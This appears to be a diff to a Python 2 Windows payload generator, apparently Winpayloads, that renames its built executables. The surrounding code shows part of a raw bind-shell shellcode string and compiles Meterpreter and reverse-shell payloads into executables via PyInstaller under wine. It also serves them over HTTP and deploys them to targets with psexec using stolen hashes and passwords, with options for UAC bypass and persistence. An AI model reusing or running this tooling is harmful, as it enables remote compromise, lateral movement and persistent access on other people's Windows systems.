@@ -189,7 +189,7 @@ windows_met_bind_shell = (
     "\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f"
     "\xff\xd5\x83\xf8\x00\x7e\x07\x01\xc3\x29\xc6\x75\xe9\xc3")
 
-payload, payloadchoice, payloaddir, ez2read_shellcode, nullbytecount, ez2read_shellcode2, want_UACBYPASS, want_ALLCHECKS, want_PERSISTENCE = '', '', '/etc/winpayloads', '', 0, '', 'n', 'n', 'n'
+payload, payloadchoice, payloaddir, ez2read_shellcode, nullbytecount, ez2read_shellcode2, want_UACBYPASS, want_ALLCHECKS, want_PERSISTENCE, payloadname = '', '', '/etc/winpayloads', '', 0, '', 'n', 'n', 'n' , ''
 try:
     os.mkdir(payloaddir)
 except OSError:
@@ -385,19 +385,33 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
             Filesave.write(PyCipher(injectwindows % (ez2read_shellcode)))
             Filesave.close()
 
-        print '[*] Creating Payload.exe From Payload.py...'
+        print '[*] Creating Payload using Pyinstaller...'
 
         subprocess.call(['wine', '/root/.wine/drive_c/Python27/python.exe', '/opt/pyinstaller-2.0/pyinstaller.py',
                          '%s/payload.py' % payloaddir, '--noconsole', '-F', '-y', '-o', payloaddir], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         print '[*] Cleaning Up...'
-        os.system('mv %s/dist/payload.exe %s/payload.exe' %
-                  (payloaddir, payloaddir))
+        if menuchoice == '1':
+            payloadname = 'ReverseStagelessShell.exe'
+            os.system('mv %s/dist/payload.exe %s/%s' %
+                      (payloaddir, payloaddir, payloadname))
+        elif menuchoice == '2':
+            payloadname = 'ReverseWindowsMeterpreter.exe'
+            os.system('mv %s/dist/payload.exe %s/%s' %
+                      (payloaddir, payloaddir, payloadname))
+        elif menuchoice == '3':
+            payloadname = 'BindWindowsMeterpreter.exe'
+            os.system('mv %s/dist/payload.exe %s/%s' %
+                      (payloaddir, payloaddir, payloadname))
+        else:
+            os.system('mv %s/dist/payload.exe %s/payload.exe' %
+                      (payloaddir, payloaddir))
+
         os.system('rm %s/logdict*' % os.getcwd())
         os.system('rm %s/dist -r' % payloaddir)
         os.system('rm %s/build -r' % payloaddir)
         os.system('rm %s/*.spec' % payloaddir)
         os.system('rm %s/payload.py' % payloaddir)
-        print '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/payload.exe' % payloaddir + t.normal
+        print '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s' %(payloaddir, payloadname) + t.normal
 
     if want_to_payloadinexe.lower() == 'y':
         payloadinexe_payloadname = raw_input(
@@ -430,7 +444,7 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
             a.daemon = True
             a.start()
         elif want_to_payloadinexe == 'n' and want_to_upload.lower() == 'y' or want_to_payloadinexe == '' and want_to_upload.lower() == '':
-            print t.bold_green + "\n[*] Serving Payload On http://%s:8000/payload.exe" % (IP) + t.normal
+            print t.bold_green + "\n[*] Serving Payload On http://%s:8000/%s"% (IP,payloadname) + t.normal
             a = multiprocessing.Process(
                 target=ServePayload, args=(payloaddir,))
             a.daemon = True
@@ -459,7 +473,7 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
                 else:
                     continue
             b = multiprocessing.Process(
-                target=ServePsexec, args=(payloaddir + '/payload.exe', targethash, targetusername, targetdomain, targetipaddr, targetpassword))
+                target=ServePsexec, args=(payloaddir + '/' + payloadname, targethash, targetusername, targetdomain, targetipaddr, targetpassword))
             b.daemon = True
             b.start()
         else:
